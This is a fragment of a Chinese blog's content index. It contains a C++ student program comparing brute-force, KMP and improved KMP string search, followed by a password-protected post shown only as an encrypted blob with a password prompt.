    <url>/2020/11/23/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-BF%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<p>数据结构 BF算法，KMP算法，KMP改进算法</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">#include &lt;iostream&gt;
#include &lt;stdlib.h&gt;
#include &lt;cstring&gt;
using namespace std;
int next[100]&#x3D;&#123;0&#125;;
int BF(char *s, char *t)
&#123;
    int i &#x3D; 0, j &#x3D; 0;
    int n &#x3D; strlen(s);
    int m &#x3D; strlen(t);
    while (i &lt; n &amp;&amp; j &lt; m)
    &#123;
        if (s[i] &#x3D;&#x3D; t[j])
        &#123;
            i++;
            j++;
        &#125;
        else
        &#123;
            i &#x3D; i - j + 1;
            j &#x3D; 0;
        &#125;
    &#125;
    if (j &gt;&#x3D; m)
        return i - j;
    else
        return -1;
&#125;
void getnext(char *t)
&#123;
	int i,j,k,m,n;
	j&#x3D;0;
	k&#x3D;-1;
	m&#x3D;strlen(t);
	next[0]&#x3D;-1;
	while(j&lt;m-1)
	&#123;
		if(k&#x3D;&#x3D;-1||t[j]&#x3D;&#x3D;t[k])
		&#123;
			j++;
			k++;
			next[j]&#x3D;k;
		&#125;
		else 
			k&#x3D;next[k];
	&#125;
&#125;
void getnextval(char *t)
&#123;
	int i,j,k,m,n;
	j&#x3D;0;
	k&#x3D;-1;
	m&#x3D;strlen(t);
	next[0]&#x3D;-1;
	while(j&lt;m-1)
	&#123;
		if(k&#x3D;&#x3D;-1||t[j]&#x3D;&#x3D;t[k])
		&#123;
			j++;
			k++;
			if(t[j]!&#x3D;t[k])
				next[j]&#x3D;k;
			else
				next[j]&#x3D;next[k];
		&#125;
		else 
			k&#x3D;next[k];
	&#125;
&#125;
int KMP(char *s,char *t)
&#123;
	int i,j,k,l,n,m;
	i&#x3D;0;j&#x3D;0;
	n&#x3D;strlen(s);
	m&#x3D;strlen(t);
	while(i&lt;n&amp;&amp;j&lt;m)
	&#123;
		if(j&#x3D;&#x3D;-1||s[i]&#x3D;&#x3D;t[j])
		&#123;
			i++;
			j++;
		&#125;
		else
			j&#x3D;next[j];
	&#125;
	if(j&gt;&#x3D;m)
		return i-m;
	else return -1;	
&#125;
void Showme()
&#123;
    cout &lt;&lt; &quot;1.BF算法查找&quot; &lt;&lt; endl;
    cout &lt;&lt; &quot;2.KMP算法查找&quot; &lt;&lt; endl;
    cout &lt;&lt; &quot;3.KMP改进算法查找&quot; &lt;&lt; endl;
&#125;


int main()
&#123;
    char s1[100], s2[100];
	cout &lt;&lt; &quot;		查找程序&quot; &lt;&lt; endl;
    int f &#x3D; -1;
    while (f)
    &#123;
    	
        cout &lt;&lt; &quot;请输入原来字符串:&quot; &lt;&lt; endl;
        cin &gt;&gt; s1;
        cout &lt;&lt; &quot;请输入需要查找的字符串:&quot; &lt;&lt; endl;
        cin &gt;&gt; s2;
        Showme();
        cin &gt;&gt; f;
        switch (f)
        &#123;
        case 1:
            cout &lt;&lt; &quot;BF算法查找:&quot; &lt;&lt; endl;
            cout &lt;&lt; BF(s1, s2) &lt;&lt; endl;
            break;
            case 2:
                cout &lt;&lt; &quot;KMP算法查找:&quot; &lt;&lt; endl;
                getnext(s2);
                cout &lt;&lt; KMP(s1, s2) &lt;&lt; endl;
                break;
            case 3:
                cout &lt;&lt; &quot;KMP改进算法查找:&quot; &lt;&lt; endl;
                getnextval(s2);
                cout &lt;&lt; KMP(s1, s2) &lt;&lt; endl;
                break;
        &#125;
    &#125;

    return 0;
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>数据结构 排队</title>
    <url>/2020/11/23/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%8E%92%E9%98%9F/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">请输入密码，密码在LHL那.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="e4f3aabbf8d864766a3a13e851f942a4d25e5cb5090c70122bd42071c1165361">d4155f2e349f5b8b303096873299bda74dac8e4916ace7f6713e912a2b246d71798d5e9a48ae3e5247ab36eda792d83dd456dda9ebdb22274f0aa60c2cb34891bb3e7b43a04825b4425fc276c68163fcd753193a73abfa8acec007ea6db8a9446a3ed3cb006faba252b62ea94f33738ee951d791d15ec14f38be1d0c569f567827cfcd1975c761389ee665c0433372fa9241c5daf55f119b2a071dbf48afea9e86a6f564a6ccf2ee0c2949d9e27c6e16e4cda4b8077fb5e4ea5bf83dab07045b67f03cee44c75b293a43a252044136a8fb047e1f965a1e4e5ea6159fdf298f81c3706d91b07919c0150475e1662fde1d8b4b2320a9e20852fa7f73d15225b4365346b938ce1c68f2da702fec1c35cc1b4c1e1110fe64589573de3ffcbc9fc6be252942eb9295d28eb29bf5b38a19f64cf9970fa7747a1409965945dc07f8e7fbb549f13b5628d613afbc22fef3f11501825089200ac6fd80e947d60eb556017a83e9ffe4e0c5f801ef30243507a6c3c2722ce53c2517afd404ed2761d00824eb5baaa21021af44805d7cb9d72ce92683543be862d89afb8435a6db4efd08d99779361d0e08449e5f1cea740994b789444e7958c7553c218c99405acf9d18606a42b2f5e45f8ca515d8abdc62b55eb2f1bffc36f206074efa6fcb25e1a9697529c6b27f6e36d231e1d5eede42b082d5a40c83a4ddf33b10fc3abdcf040eb962a324b0d449c7072885108b248345c37aad231c558e8b443356083f4539d21e92311ea32e3009d073cda2246f912cd63fd2b6d135ccb069f2b85354f3cdd4c289917017f1dec898b04d709d6f8e0db892dc1c90726544cda4558f7890239a0737762079f34f124826bef2c2e74bcc4f246fa38a8fefa05885a0b68f8db54fa173de84b940f74f3e2e17d0892212a4026d23f1ebf56d564d894174ccbb8751db0d0a74c594d931d23a28caac9ce8263e3f259013f80049806336797d735753801b8e4edb554d712ea29b7de05745c06ea0935971d3ecf90d2c88420445802278796cdc1f8a53dcbdcb777e08f02b4efcfa3419a8a4291778df78f1e0e13444aa697767ef693d47dc9c6bc5e68cb8c397205d4584d1f25621c50edc965ab3b970d1d6365ba57d08a8b366b6077180284afb0e35052bb378122fff75d5a299878a009f00355079ba8a576da241da2f2ea2e2e841007d6823f7bbeccf824e7ce45198056655a39323ef6ddc0f5c70baf23586d8f76ee7ca31c515c502375b8c28f6e14602154527903081d11e65760a8b84ab7d051a03e8fb2984db5c1a11c655e78ae7375bc0e27c3023688f1daacde1c380e9b1511878b95d193a1f661a0adee71b21eed23cc1f8c46aa6a05bf07d2a805bddb92d36b36eab80d9ccfeef1bff2956989f6879adb6d842c07502a1758fad6ec49a7a2ee24776bff1bdfdc4ea110ce84c408f8d8cf3001fe6104db3c8734312ef0650b8b96cf2a3a077941bc5f73673b70f59d1915b120d92eebfb014f207143511c0a39cbd5cfd4661eb70816b70f5fe9774c689e2154a5e75d9bd53a730afa9901964d5bac61e3532bc4f2d517665865c276f59dcfa01a2ca8a9d60c4fafd4bc9fd841bda3d845190e5ad0e188f66d64874c11d9e0b9ff0ddfc79d18253f74a19317613ec2a7f5a29c7ca00ca13fcb12ea5a6bfad298485c2afeefee5db0d083933cb9cbe51fa63d86be63ae99cccc34ac5f236e80f309f4d7b38cb31359fe69736fdff0834cc168a7aaf2e284bcdf302bd5db812df783927bb7b518e56fba3d90e85afcd49a4d76739d61d4c638e671aa18f424490cc05fdbc400bbb06a7483e6af833ff27ff818f62589d6f0d2329509afe11f6a33b1064b77e77f47819c4608d67093423399ca4e9fbfc0baa0d97a842881454d4f83517cca8b269e7c8e91f95e8499ada3130da527f0f80d86486e2460dcc55ed60ce8f841a72780f1d94f257932b8f9a8aa58ffeabfe8b06291336d13b0af691e0838ec211fdaa40aacc35aa0606226a98bacca75c2b41b8e3c89b52b1d9e2821ef454583ce40ebc2d2a6399e8810c7b5ce0311d310a0bb6a97b1ae0d8e67d18905ec99abc2f62ad72e1612f07a6b23e1bfca53b48d10555a8c9e72bc522ab79d3f9b1d866429b201c0caff13658e61580f7bb714d8819cfbe5bb9375196e942ddcecdef08282eca04529a666324030707c366246fe084c118b90e47b4c479ed991ab26ed8395a677b6c18c129cfcbdf08c2ae9c877f7ba8694288854b003e432dc611718db1e975a2c821c45ef7a431644245ddf20ecb91ab39e027860f64e8193c6f96b472075ecae5cd49da2ea6e1b462cfb2ac7b98c9860cd972b66ec508409ceb96361b70d54c1ef3af398dd4597d1254a4193247d82695f106aaf0bfd4468c5d6614dbfff5ad58f6fe40b3e1f2e6d49e4703a7e86fa8a33eb0d9386c867d207a7952a9088fdb8d30b45cea1f178e5fb09b9d8e588c986ca2182b5efee271cdadb597a7b1cdb87fdcda964d9b5d38b9533bc967c0c554fcd89694f8ffbb24cc4012f716c1367df7889ce88ec907aa70cd17086d16f2bee032bd364753800621e47bdd3ff071e0ed592e28706f5810250f21a930e1049ff1afe57abd2cfbcd6dc2dbfedd40716c90698663b857757dbf9d457b85ee92ec2d5475082236c8b429e9c4d718716f9d7968757afce20e76e6a23c1f309405973b74501d54261f62bd014c9e9d150210047cd66b588931e5e5d87c68f30a2aa771630847df12b580729826aeff815ac0d43703d7230d3dc62fed41c34874298da8e33b5787fe882a921513cb56dcc1215e5023fcef99de2239fdbec32a3f94290d1eb5a5ab18268e56e9251047393dc366ad5628f2dbd0e40c07357368d3426f61df5966f1adc0de5b1201b81d7351318d109103274d03c1cd4142edcc6e3439f51155be1dd7013f2f8c11e590a6559f224e07bd2dcc334b030128b38a9a8d848aee328a36f0afb11e2800916369e620ae24e48c3700c7d10681b8d1865a183f2ab226a0ca289dba182f8429785eb15c969ad0af02eb3c12e5639729544b30f8f871f7cfc0fee3b02e7a1246ad6500fa6cb0409165ca0651808a19bbf79e424e4f992bfc6a919c228dba97c2dc283a84f19a9466eb995717c327dfe41e76a12f2128290e8e5c1a04684dc8d2c1b3aeac949dafe2acdce5cf87df37fc9d85357ed5c4ed3b320c2b4e9618a94b9a78b1159fb478d0350ff4ca6d04ba8ad8d58c5159b56828cc1ad2062edd3a46007f7ba81a44ff7651e4ee75164c0b27f4d1321f4bd406195b6e93d51cf664c66859d0417ec6173148932f719ef34f4dc7074ac95061cddfd15cca96afecd8c35e2588b7f98338556a63c4d9e3dd4ec0a83cdf9ef340e451840c804dc11d1c1d120530452cfc686abe3ba02afb923eb4e05f10efa71b6574ccc3df08db0ec58db35d5695369538bb638638f97be2d5f3f9272b47d34a5eac990fc89b312cdd6542d79f09f0b0cc2ae27db615be6940b3c192fbe9817cef5d45b54ec07f06f9b8d3aa52a24dcf14db3b55d1b3ec54f84861efcb9a26756867bdfeb7affc178391868a689cd4ffbad32bbecf853111f0178134251174b1479bd531097411f7ae9effd8372ad5c8f6f2188a9d54750015b1c174933440e75ca56c011d834cf9cbe6eba46844db9a94b4d14650902b80179b3a865ac72e7cc09b3e9abca7c8017a92cd2688560736998a7c6289141777d37a012169d610d2f483047777ae9152c268631de5831fe4ef4f42a0fd5b7661fb56bd7535d30338088f3214f6fe717679d5c680dd919cdb8ac1c7999c97b4b242494d2accd6e4e4c73632a9bd429c70b21b1d5bb7c240777eea073463355ce65b599a9b7d2e6e1f750f0e0db3bcc72b8f3d81cf6c6700d4f8a5171a7848aef0cce95dfe049cdbdadcf224566439796ebe5752f6d43fb0e41a02ebf3f4442503afc0e5adbae9c998aadefb1657d6e82685f33dac6eeb83cb0b95da693eaf0c54bcf8db3b1a8860972dd080d144c9e1b16ec7538a5490fbef0eba0ee472d48a35ad7da44d4ec430be80ac427bcb52f9ce6a5d3b2539d930ed26c547adb07af5c40827b46a81c8a0bde0730bd735fc6432e41f025261fed10e9cfeb585824f62445fcdbf92955a58b561e374ba00f22d240475cc6464279194a6c83aa3ad514b25515b7137e9c07c92a42635f0f1971eafe24b51e90467135c8c35b37ef5ccbc7bbd802a596b82ad2d1c7e427e8cbabace59dd2f88976cc1fe79d7fcf54947aaabb233172b661c6ccf52c7530a519ff3d185bb5a4d9fb68f2aa1570174f087407cd695a747129bb5f99c0a9481eae3f150d1b400cc4947e375299e552494d92a5fde737f19de0cb294458a8e86377641419092a63210a587c45f9bbb2b314c8ce88800adbb9e2edf77bde9aa64c2225452409284f34a3343e7612f8dde0ef292c56f9fba54b444ab6941549930e9e010387b80590fa00337897945a61cf72226095ce0d453b2844bebef6ec73dd2423e3b8ead8b60e176f58b2565b3238331812aaff2f0cacc54ff7913e34d10f289344e2a2eb620dce7267d61d272dba28901f943e19ccb2df1103b8b84a0ecd6b7d57a76b0cc8cf0bf8bf64e4025e37b596462c41390199823737986c565c75223fc07982935ad188b6d8dfc354c93534252217e87febe6256894480c1f3f9bb3dd386a6f0b9ab4ca1907fc732394dd1cd453a4bbb70128ed9262ae4cf93af4c1aefd051e9b7dec873da58460f80a2ea8b26a92d63f75fe504a1b1c3628a7b61a33564c15cd42bd049ba1d0c41648ee1253faa0aa3df4beda7c9f44b94b5a689c3a5b455e944872b2866489e5f8abd26cf721ec01b199709f587af06bbecfc2a195696e2918e47edb1c0d182b6b69f358cca4f12a2355fe407b701660cfd712027c6ec33c267d1b9095a70c59d9c6ed9df2a7a176f2c99886a47118835c0bffe0a04496d2da2f5c262e004c9464d0a8b8531627e68f002285a324040d21e341b6375725046c00977780a61ff62d850734daecd3b7a36888bc3d67694a87d578cad01d036b0f8dada3e60b1eada2c82a32687e904c635806dd13b2af76bdac659b3f5df71ed0122c2c105b3998e4024a68ed11c7de7a787a0e1c186d79fcab5edd317658dbe961542e069e555bbdd8a191167c383ce783a874415384eb5fc1893847050c1fc312d3f9694bf2152a6eacd0a05de0ce0bf131155aef2937714e29306b2f282fe8199178fa0d4d872e00a281532becd08e81107ab3c2af005a56fef03d3361056a6f6dbd1f5dfb0bd8cbff0239615530ce0d487348fa8f9a6cf69fd9669a4553827b81837b918902ce9fceb6faea623e928585025bc416c3c054f512120bac9a92b151cf7e1e02ecc01173fdd3cd0bd973f96d9bb38974ee4b11fa0f1994ffc8925284ed57e7c9879f7598bca38f76321bbc3403eef724003dcf86e33076b409448aa39337e7dc02138e7a7426f87f9c847b5ff09c7e2f184693f94ab05fcf4b00c335c2f5907fe868e685aa678f9a1224e805e5773ec15123cb6e06638da0e5a536a2eb9285d2c915baf8112d300354a0906cf8025e8487d0ebf0e57b986cdc628193e1fc5ba59a49ca0727099b0a96ce73ab99e7aaef96465d94afdaa68057499e5e8b0dbd7652e1acdfe32b370d9d2f375bf50f2fa383c094f666c8111f61bf61cf0477fc7682424294e8bfe815cfbcd9b6af0a2378c0de29ef28b6659e532c4bfd907eb0caba1145e15c217e42d231f4b81d4ba6d4582468b475e58d0d44bfbdf1c26e56a423eed6016357c000880461bc7be2cd7f472fc3f436def9e898794d05f47bd114a62551157c5cf54b02faa84505c43b0e44a1a3a66f1fff5e419a6885e2fde25fc39dc4d22a571c2948909db5bad8eb8df34453b400da170b73e9875211b169baf341b02a80ba6357c80abf60790901ac5cef8571c62805139bd9a64b7928e84a2f46ed006a1815b85b7ad29ab61feaf8b163dfe95c771c53d775d9ca05fcb27e92c469c390e6e601ad4fbc8c36a8056ad55cdf416fd734988b6acf7782851d64714204133259f56e24e07fc0a71cc6b2ae48738bed200e4faac0abdd8729918c04a45905adb62eb9d06fd56f53183633861e0da1b44059bd683d01a788fcdb5191671398a4e356cad57d24e7d6d11eff0f8ce8e092f621d3a5768a0ab219e2aa1b07bf9d194c725dbbce7afd52ed04ace7719a87574ab42cce8327e85564bb8f9a10f004bb5a6fde5885cf12987ed13d134e336eba36c99cf66adb5ee4a6afef778f17c71abe576c036e3c3549a78353d8d0250d26bc4959327ce23a8c1b4bff77137b2425d43320914704f40ede718ea65b589d5244319060a0d1ae18533750ac4988a1791970dd798e6efe88d7fc86afa1325e86bba0bab3a639f826665f939745551923ea7bcc1b4552682e767bef2a417536390feff2f97b66cc42124110b9f7449d4cd011d0580a1d4405a9c3e7a591f7d3f52a64f06221d598452730670b14a3df86ae114442923288e19c881f6c61e13c69bb70f7914184f5d8d33adfedb08709432da8ee896e6876f11fe43e54af8b926694404909a1c553081b19c56af893b30339125bc407a4d97f2ef799418d6209843182ac919a8e372f5d532e2a52d6b9ccfea8d7aa76199fe0d2eafa6e387154a86ebe25d9f35f11dab6cc45ad6c4a54c66485a8016cd1af2deae2281a0e0d5daccf7554fbaa81fbf31213e24c02df942be9e19c7a7558f277d86e089a04106ae8c17b3b566773a758a91813a2ece054aef5bd65c88df5dc7e3d7dd28055bcea4b1376665d4e0abbb5398b724cb169ed42949f53ea3797684e1b9715f1c174582726802ab02322987512c52af8633ba1a8284f871d3fac2d0bf25e13a9cdcff787a1bd1c5291162999a10dae1ee7533d476d8e6e7ddca086825b6cd8dd9a32c1ce1770918bb7516929f89b48fa3356ee94505e81ed61e21f93e66463fc3ec0a48c566aa6bc0b15d9ba26d29dae2fafb5f7630dcff010e016cd1bad09364c9d792e0d994c08d0aa0ef616c2e56f066374dff5fd3fa63b9b6a5bc295c3cf617678e7fa94809d431c6e3ea16a311bd93d5b286efec5faa02d08a8b3b04329b0bd5a6a70980d19721600f207899ab3c3f7310e5d821362b5efc6731d5cddaf4128c938a0cb84c661e264542231599a59aaddf7ed50db46911b29b78e1f4485406c595579205f3d413731adf4a994dcf6e2e972d4f0048ba92bff8c704f3735b43ba6aa2a4606610cc6ec47e5841ef048ac9277a3ddf868c71f40059b6e1a280f47bafb9635ecabad5914806184d71cde500ab37fa7faf8a1f2200b6637aace762be6c4a30f05d22caf342c8ba062199a4fb389e1c105f98351010da365df4ac67d8e7c7ee6192a7bf872b7b7b5c95e26a7798d46ce17af60e5ed79ba5463aa2a23b7b7085eb29017bc15d9de799aef27cc03aa94d4e97e56d4a010335cbee202fb0fe0ee975ea65465afce2ed2278a3d03d256b015e6996c34ff88fa262ab8189ebc9ecffda5731bcc2478386e022a7598cd10c82aa45bf7cd4c565a7c771a819531387f9b19d83b11721f3c98a90f0dce0dab2c09a5d6949fbb5e22db40ff7242403342064b3612eb007eb6d40c1660193842f14498e9318b0827ffa606db6d68979146ecdecaeb4c887e79b749b1ad8bfb2ea38a85a35cf66e7e1680ad02aea97457e3a0e1780d8b72cdc4501cfaa48b839b6d94cac417b2e41923f9235b6912c8530b8710f423f48f81652add8e93fcb1ac95dc9f78d4ddc5ea0f321299ccb5657e0472af7628dc01f78e917e2bae73907c40a75cedd479a8838fff15f82dd765d4eb86d7e918435260131e6ba3113430875c9f265a4fe582567cdc7a74f7ac3ca78aec914d8a5b506a7cf932159cd01cdadd691c20019e1a232842ae905dd4ca30511a55f8fe3ee4109ce68bb0403a05f22c824c4759f9045ad4cdf7aa243a4a8322a200a0256f0bb765a53d20140261b0940fef776485e43afb20612ac4ef7f2d3337e738e36a77cfbf9e93701db503ef44c1ce6400ff6df5aa829464ce4aacca0edd956f64bffe4eb5b93cccfbc9d7b30311f8188a018bc4da4a9eafb060e84ce906a62350d1f16075fb38887b207976dab690e5ae651e578dab0d0dcc18dccb572a9d32eee5c92fe61566b2bb5956814a06ac3a2932c790d6f5b84279f1b341217bc84d8c3d1d446bacf029ffae000fe69d3cf948f49a43194250641303667e2fa915c27b6ac32ba742d12f19c7c0828e342537228152f80e1179af34bd0a018157ec09c13dad6df2162dc18386eeaaa3c5914a0d4dbf7659699557d5c4b83180c61e3816669dcf0cc9af504d7363531cbde2f922dd5285d4c50fe24417546094324fbd853fcebb3211aa0804cdd928e194d9412b19e064c7bff1c51c2c8acdc9271596dcc3a5728d337e5606c397cb9421b1c8ba2d953479c41a03eca954057317ada8c2b147fd1bf227153aa8a919978f4d77a9bfdaea9809658357de0be55d098222a66a76344faba5f884a1194d59fb8ca0e50daee52bb100b633810f1a462218f57a3ed924176473d8bfd889a7a3ca06d36039cecdbf455425900ea0a6bf4109acabeb04d665ea91741c567a2c688eb79c749482f4bcafd80a94c21f59e09688cec7d19ac54854bf1e6506fa0000c800775300c68fdafd1ce9f2cdefa976ad914278b29de6cb5e5a848d35146ab755e937e1c1d4e013b41fde3133b8ba4de8181b50fb5a1c7b266d1c87a103e9101a260721431f6f9f808440a7d6492dcebf770fc9612fbf6a15beaa8d7d96b32accf7d57953ac438364e9ece0fc1526db30151e0fd0bebdb100c33edb8420c3807c6eb8131382ea381238443dd0a869c92098fac691f74a3f413fc3c767c1f6a89fab3c265b90228a49ad94664e7d29ab6b938b20cc5ea26ec30e305894693bed57b3a55f64493be39eee492e5ad107c31ebf1a1b408e00f600194ed4ec3a8e500f2cb951f97cce90e03d4abf1ee3e0bd9dfc3f45b236719a5c40e7c02461b54ee4575ccd22e7edf06d750dda8172abe810d22841ad8b57a7b0820ca92d7e478b630f8fc3277ee15ffa69eb7e4bf252981f09d32a39c7d9af8bc490598d3e2b7c0eac3abeda54d7d343cf67c56c03c582be585643438fe949a01fe0e9c01feb9eb36cdd46241b9aac7fe8767b27897265620fda0377ba404a90e3f1bbab9513f78f6151c99e9136f684ba49ae7e79c3f867d9aee54e5d51b8575f119bbc68ca3363aab28acd60a253e668bb222492d451782365a36fddcb8ea3d73b03ad701a66a952050f9f731736b022958ac80d5753d590965e1309401451fb9eb315fb6fbd3dbbc8dedc759ed838aabcf248dffafac9c15aba97472f3ea28ed5a37b6495433b42694628ef345422763e25121140d4389963a0ff12a665a926cbd5758719dddaa840b6902a515c31c57621122463e9e0329e152334fa1fc7e0c661a130dd085cc1c722c7d9b50665e9904104d9f75f2422dd1eca49d57276a575443ea99fa9f46bd9c85a2324bbf3b79f65ec0b24940c18fded6dd143485cd876e4b1862f677c9af8e153b9397b9d0d92123a38a57d3571536627be967de988b32201fa493e822f6feb2efe0a8ae1f432445cb07a7977d420be6d10764f8e175d8594cfb9ebe26fa999beee2fae0634e39b7e1172098e8bd76a02cd067d17c5df2a7185e78c3a7f1479a7b332d2bdfd340c91687bc2f89c55c257fc3e31e9b1725edd5c54cd5bc302b6d3d41b99a4cf90432dfefcf1d3c1a5e51becb8b55ecd9e63d339d09311e848258c8fb6fbe257f70268769790ace4f915f7922ce05415e912c76bd7f7b686a3ec4d371359ac5e74bd8f02d66407921b2ce497b250bfe497caaa2aea61b3841f5e834b150bb93586f48342a3192da77de9fcf311bfef5aa55f4c0a2ea93cfadf63f27206d85f42d095a88374bf69d07c90ff95746171b452e2b6a6ec0499df6e6ff884f87231939ae033145c133eac856b5df199272e24b4fb81962666b8d7270008adb5014236b81f94871ba2461f47991677b453c5f64ffb3c003b1ce4c342e32859679ccfe51877f6547600b486ea9179e4de365d02971867598e27c720e2b408dc4a4b388ea97a0466523a11cdb868cddffc779f7e46210610a26854a7fb089ba48b242063a643eb3c763805daac63e118540edd6f9e526d4b890f7bcb6284c93dbf33d1f88b18ace2eb84566748b8f5736826fc723d9c6cfa56413d6159ea91a40f670215df1397b01560abaa9a0fe0a49f06fd5ea3d3a147d398672590221bc7087b02a981e86681726933acd7a3db35b879027d20e53097d847b357ae28847dd4d5427ea966b1a7b8fbc0aca6706f87320ad63e6581323ff63c7333b53edc13bf06c8b517340400404ea1d1553da7b8ba262dc1e0f6bdc45a104c9bfa2ae8ca4af5e3b6ae9f4e483c2c46d213ae77f29c06adec0838da279e46c76f672f4f75468c69ad52be6276053bdf6aad7b9145d7be4531be36028d609d54afa1dbfbc4234cce92a183c19a40c69f4b15abb7bef863fb10aa0c24fef105580fb65a7d8e8db71110a5fcf93f749dc83163e21ce42050a0b904193df8d34a785f254a9c204b43e92dcabbd67e4c1f5ea1158368b8ed85fe331dbc752060563cf602eb12683126540440c3046a857fcaae710c26c6702200b3bd118a8c468b33c8309ec6e16197ed6e3fbc29f4bf4c27956107add9e7e02f8c0aaac1675f4a040ad44427cc7283238e2aea3dc2289fad26fcd5f9ea7291edb8ebd52c08dc6c3d21b358782ade3fdeb95b4a73ff53391994f7eee071091105da82fd0755a2958165207a33330c6ca9aafa1cf449f128480143e941d11e76015ccb2afe13c9dff7b1f4954b083a5c6d3eb3ab8f821970f821fe13ea5bf397d8c29f57b9c14f8e7c0d579d046861ef96b35fde5024a0afed335e996f532e4c7518c6b268f2aafd43f4de22e829b68238d32aaaa4c44714c244aa5d4c98d8f81b642811858fa7536b3690ccb04f54441171698574105e7577ba82a32022d8c3722943e8e53df1f8d527c8a37b90f99d79ee1baa0c5d4d8d173ea2753345c3f935b0fde60b149f789dab9560ccd809f4ab4826c76f451ea49eaa90142f98da86079f4cbe686ff39197ff223d4c828fe1261ae9b5d041becfe2e528e38a646c9cddd91ece0dcb9ed56d2c52d6779b33736543491f6febeae28e83c5d3604634c3a97e004930e00dcf4d73dddc0a4b4bf9dc78e78d4ca66e196e11491fafafa50b60d750e14fdef239863e5fdaf9e2f6e1acd282ac8fc9aada4b76b9ed297241551bdaf3fc8317ed695933db0b4b84c82e868c0be1902281668f04c358756752d35d06de8d703249ad38527dd851c3244b08f849109a24096c6c87966709a7980b8b5a46372fdf0c82659050274d606431481372d71451ddacc2643a8429c604afb1406090236bda8228fa1ecb5cc5f98f2ed72f5fa7d91c1fc2fd12cffa31cf6fa0d00c4f254a0bb8cd131be0d1281ddb8a36d57c977894898c59c61a39c64e3ebb33b8af642a43e82a746fcbfb5b60dd28c40d8eb3e9893679022f000eba4d27b2fa1e6285713e282f19b151139e68871a7f93068ebe7a1cb03083eff6376f50eb4580d9b70321e609a5484c358e6b5fd852e4d03da6307aeb7497a4d5cf917c92db5557f3a001771e40f85964e4ef767fe0cb9ed32f1ddb0dc600b84b15d15d52d943fa29ac8cfc1ffce6a8bf123437df647b9dff893ccb9ff342f476cc12f55b870f0e3ec970ce6300d2f663ea969a38880a91b4d1f580639b08d120a51c468d12f7f1435e2f7729184d7ef1958b186d2e3f71d832f478f1bcc893a594853098907ec7aa7604310082612890b4f12c17e21ec29736f294d05fbb1a533b4f2e48e8fb72c7566fdd0550e2cc5abcb5a057c67b00ffdd30fe274c5ce9ba900c553928b2baacef306ad50624ee0c1abd88139244abdcbcecf5f2bcc9edbd8ce9bb0f3d59af29429dc9cc2cdcd249f011dc70821d2a1d1d288b0e945ffa6eca65ef8476af01e3402a9aaa1dba199dfe2684da338a4d8e59b85593c11f1ffe9e9646d5e24b8ca856457a0b555137fa745d33c777949414f9c4067595463932d4c98eaeeec7d0fdd68c60d10c17c94e32bcd198c86c9cbba56042b4454d4536ca4dc608da3a1c3c16b7571011429743b43d99b36ec288a7e5ba9bb17afa078b87a37a252316e23222b57dac05e0a2472b9df00cf654f77728c937d414e31b7c6bc66091c5b9e673e8b32192ba64fb50a01e78b9f724ce9bdcd76e3ed6d3e3534c501f6990bca536fa01964d61a320c5450c585f124704211466f406c786e4cbf976474c9514668373c4ba32020e551cd7274bd597c19b37245c1ff9796a4dd5fcddf34b0bf3501b64ed51849b108022af86731236455496cb8f6a6c229f718d08e930259934286b8fb57c9d9c2018cefda5caac88a68abb71e967f64ae09846aa80f0951b2ea7ade845ec146a86166ef3576379ec09809469c23a39dabe76e2fa810e90846a3fe52dba97bec934838fa7ab1c9a1523e0dfe6278da61b01a9ec14d46cfc9e6afc2b723f69cc3a058a520a42a83129ed771da61a60ee6a4b775a5f5f6cc5622f89b5a766c05396a1bb53326df33801a703a4ffaef1a72dd895921e080ac75a4fc32d5b391c326a9498960d0d4110d4216170c02606925aebd2f935b05e3688acdbfd5d1296645ed5c2b841f3c33d903ccc78bcae2721c32ed4497b7a8186f161b5d2c37c4334cb873b0255594a6b8b86cb3c393ae048bdf170fac564c9fc4ab71c9cd3ba612634067c79825cdbd46d15a4a9a79e00f2e61bae665c282529dfd0022c609f1cf0404af632857b15c803d8f94daeb76300eb6f8b0dba93a22db2dc8e68a4c3fcd671fdad34d0b9cb4845d9950028a96c352d2c60015fe2deae16fdba1827db605ccc1855c3a84546eef0968555a240410b2be804505acab447f7fbc437dcf1726b2b59f2be0b568f8d5bb37357df318b711d152973e0b0c9113ef5da20a3b293c376f9a5ce6ac24f99bd5b38aaf327d016fd921c452e35a5a16c8b09600f62ffd49769ad508fe9879292e8d45a9297941dbc96f69b0f977b9190150a4b08f9074b55fd8aacb6a36993a24f69a654a15a3c6048156eae6135910ebc41cda2c6b09aa22e9b68f570ba3e76cac3ffb52ee7449ab59d6dc023c8851937cec5d536742cad50e2420082e3a35f7e843e030770a756a1237e4213b28</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>数据结构 精简链表</title>
